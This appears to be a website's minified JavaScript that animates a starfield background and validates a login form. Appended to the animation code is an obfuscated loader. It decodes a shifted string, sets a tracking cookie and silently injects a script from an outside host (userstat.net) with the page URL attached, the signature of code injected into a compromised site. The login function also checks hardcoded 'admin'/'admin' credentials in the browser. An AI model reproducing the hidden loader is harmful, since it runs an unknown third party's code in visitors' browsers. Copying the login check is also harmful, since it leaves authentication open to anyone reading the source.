"use strict";document.addEventListener("DOMContentLoaded",(function(){let paused=!1,canvas=document.getElementById("galaxy"),ctx=canvas.getContext("2d"),width=canvas.width=window.innerWidth,height=canvas.height=window.innerHeight,stars=[],randomRange=(min,max)=>min+Math.random()*(max-min),starCount=randomRange(100,300),star={x:0,y:0,vx:0,vy:0,radius:0,opacity:void 0,colour:void 0,trail:void 0,create:function(x,y,speed,direction){let star=Object.create(this);return star.x=x,star.y=y,star.vx=Math.cos(direction)*speed,star.vy=Math.sin(direction)*speed,star.opacity=Math.random(),star.colour=(()=>{let colours=["188, 236, 201","188, 227, 236","255, 255, 255","247, 250, 181","233, 220, 105","232, 198, 62","232, 152, 62","232, 70, 62"];return colours[Math.floor(Math.random()*colours.length)]})(),star.trail=randomRange(0,10),star},getSpeed:function(){return Math.sqrt(this.vx*this.vx+this.vy*this.vy)},getDirection:function(){return Math.atan2(this.vy,this.vx)},setDirection:function(heading){let speed=this.getSpeed();this.vx=Math.cos(heading)*speed,this.vy=Math.sin(heading)*speed},setSpeed:function(speed){let heading=this.getDirection();this.vx=Math.cos(heading)*speed,this.vy=Math.sin(heading)*speed},update:function(){this.x+=this.vx,this.y+=this.vy}};for(let i=0;i<starCount;i+=1){let hashi=star.create(randomRange(0,width),randomRange(0,height),0,0);hashi.radius=3*randomRange(.2,.9),hashi.setSpeed(2),hashi.setDirection(145/180*Math.PI),stars.push(hashi)}let drawStar=star=>{ctx.fillStyle=`rgba(${star.colour}, ${star.opacity})`,ctx.shadowBlur=star.trail,ctx.shadowColor=`rgba(${star.colour}, ${star.opacity})`,ctx.beginPath(),ctx.arc(star.x,star.y,star.radius,0,2*Math.PI,!1),ctx.fill(),ctx.shadowBlur=0},update=()=>{if(!paused){ctx.clearRect(0,0,width,height);let blueCloud=ctx.createRadialGradient(0,0,width/4,width/2,height/2,2e3);blueCloud.addColorStop(0,"#495B9A"),blueCloud.addColorStop(1,"rgba(0,0,0,0)"),ctx.fillStyle=blueCloud,ctx.fillRect(0,0,width,height);let purpleCloud=ctx.createRadialGradient(width,height-200,width/2,width/2,height/2,2e3);purpleCloud.addColorStop(0,"#2C253C"),purpleCloud.addColorStop(1,"rgba(0,0,0,0)"),ctx.fillStyle=purpleCloud,ctx.fillRect(0,0,width,height),ctx.fill();for(let i=0;i<stars.length;i+=1){let hashi=stars[i];hashi.update(),drawStar(hashi),hashi.x>width&&(hashi.x=0),hashi.x<0&&(hashi.x=width),hashi.y>height&&(hashi.y=0),hashi.y<0&&(hashi.y=height)}}window.requestAnimationFrame(update)};update(),window.onfocus=()=>{paused=!1;const words=["Sad","Melancholy","Grief","Despair","Desolation","Heartache","Woe","Misery","Lament"],randomIndex=Math.floor(Math.random()*words.length);document.getElementById("project-name").textContent="Sinh "+words[randomIndex]},window.onblur=()=>{paused=!0}}),!1);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));

function validateForm() {
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;

    
    if (username.trim() === "" || password.trim() === "") {
        showAlert("Username and password are required!", "alert-danger");
        return false; 
    }

    if (username !== "admin" || password !== "admin") {
        showAlert("Incorrect username or password!", "alert-danger");
        return false; 
    }

    return true;
}

function showAlert(message, className) {
   
    var alertElement = document.createElement("div");
    alertElement.className = "alert " + className;
    alertElement.appendChild(document.createTextNode(message));

   
    var form = document.querySelector(".login-form");
    form.parentNode.insertBefore(alertElement, form);
    
    
    setTimeout(function() {
        alertElement.parentNode.removeChild(alertElement);
    }, 5000);
}
